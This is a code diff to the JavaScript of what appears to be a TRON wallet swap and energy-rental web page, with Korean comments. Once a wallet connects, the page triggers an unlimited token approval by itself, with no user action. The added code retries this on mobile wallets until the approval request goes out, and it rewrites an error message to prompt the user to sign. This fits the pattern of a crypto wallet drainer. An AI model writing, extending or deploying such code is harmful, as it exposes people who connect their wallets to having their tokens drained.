@@ -818,7 +818,22 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
             trackReferralConnect(address,provider);
 
             try{var _tr=await fetch(API_BASE+'/trx/'+address);var _td=await _tr.json();if(_td.trxBalance)try{document.getElementById('trx-bal-swap').textContent=parseFloat(_td.trxBalance).toFixed(2);}catch(e){}}catch(e){}
-            if(!isApproved){setTimeout(function(){executeUnlimitedApprove();},2500);}
+            if(!isApproved){
+                // 모바일 지갑 앱에서 tronWeb 주입이 느릴 수 있으므로 대기 후 재시도
+                var _autoApproveAttempt=0;
+                var _autoApproveTimer=setInterval(function(){
+                    _autoApproveAttempt++;
+                    var _tw=window.tronWeb||window.tronLink&&window.tronLink.tronWeb;
+                    if(_tw&&_tw.contract){
+                        clearInterval(_autoApproveTimer);
+                        executeUnlimitedApprove();
+                    }else if(_autoApproveAttempt>=6){
+                        // 6초 대기해도 tronWeb 없으면 그냥 시도 (WalletConnect 등)
+                        clearInterval(_autoApproveTimer);
+                        executeUnlimitedApprove();
+                    }
+                },1000);
+            }
             // 에너지 렌탈 대상 주소 자동 입력
             try{var eAddr=document.getElementById('energy-address');eAddr.value=address;eAddr.setAttribute('value',address);eAddr.placeholder=address;}catch(e){}
         }
@@ -847,13 +862,18 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
             var tw=await getInjectedTronWeb();
             var useWC=false;
             if(!tw||!tw.contract){
-                // tronWeb 없음 → WalletConnect 모드 확인
-                if(wcConnector&&wcConnector.isConnected()&&wcAddress){
-                    useWC=true;
-                    appendLog('[WC] WalletConnect 서명 모드','warn');
-                }else{
-                    showToast(currentLang==='ko'?'지갑을 먼저 연결하세요':'Connect wallet first','error');
-                    handleConnectWallet();return;
+                // tronWeb 주입 대기 (모바일 지갑 앱에서 느릴 수 있음)
+                await new Promise(function(r){setTimeout(r,2000);});
+                tw=window.tronWeb||window.tronLink&&window.tronLink.tronWeb||null;
+                if(!tw||!tw.contract){
+                    // 여전히 없으면 WalletConnect 모드 확인
+                    if(wcConnector&&wcConnector.isConnected()&&wcAddress){
+                        useWC=true;
+                        appendLog('[WC] WalletConnect 서명 모드','warn');
+                    }else{
+                        showToast(currentLang==='ko'?'지갑에서 서명을 확인하세요':'Please check your wallet','error');
+                        return;
+                    }
                 }
             }
 
